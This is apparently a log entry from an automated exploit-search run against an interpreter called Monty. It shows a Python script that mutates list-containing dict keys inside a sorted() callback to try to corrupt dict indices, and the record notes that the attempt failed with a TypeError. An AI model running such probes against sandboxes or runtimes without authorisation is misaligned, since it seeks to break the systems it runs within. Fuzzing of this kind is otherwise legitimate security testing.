# Attempt 139 - 2026-06-07T14:12:54.756729+00:00
## Template: A | Score: 0 - Nothing - standard error
## Exploit code
```python
import sys

# DictReentry: tuples with mutable lists as dict keys
# sorted() callback mutates lists inside tuple keys
# Hash was computed at insertion, __eq__ now sees different content
# This causes stale index corruption in find_index_hash

d = {}

k1 = ([1], "a")
k2 = ([2], "b")
k3 = ([3], "c")

d[k1] = "v1"
d[k2] = "v2"
d[k3] = "v3"

print("initial size:", len(d))

# sorted() mutates actual dict key objects
def mutator(t):
    t[0].append(42)
    return t[1]

print("running sorted()...")
s = sorted([k1, k2, k3], key=mutator)

print("\nlookups after mutation (same objects):")
for k in [k1, k2, k3]:
    try:
        print(f"  in: {k in d}, get: {d.get(k)}")
    except Exception as e:
        print(f"  err: {e}")

# Look up with fresh tuples that have the ORIGINAL structure
# This is where stale indices should manifest
print("\nlookups with fresh original-structure tuples:")
for content in [([1], "a"), ([2], "b"), ([3], "c")]:
    try:
        print(f"  {content} in d: {content in d}")
    except Exception as e:
        print(f"  err: {e}")

# Force rehash to spread corruption
print("\nforcing rehash...")
try:
    for i in range(300):
        d[(i,)] = i
    print("  size:", len(d))
except Exception as e:
    print(f"  err: {e}")

print("\npost-rehash (original-structure lookups):")
for content in [([1], "a"), ([2], "b"), ([3], "c")]:
    try:
        print(f"  d[{content}] = {d.get(content)}")
    except Exception as e:
        print(f"  err: {e}")

print("\npost-rehash (same object lookups):")
for k in [k1, k2, k3]:
    try:
        print(f"  d[{k}] = {d.get(k)}")
    except Exception as e:
        print(f"  err: {e}")

print("\nfinal size:", len(d))
```

## Result
Context: Template A DictReentry - tuples with lists unhashable in Monty. TypeError.
Score: 0/5 - Nothing - standard error
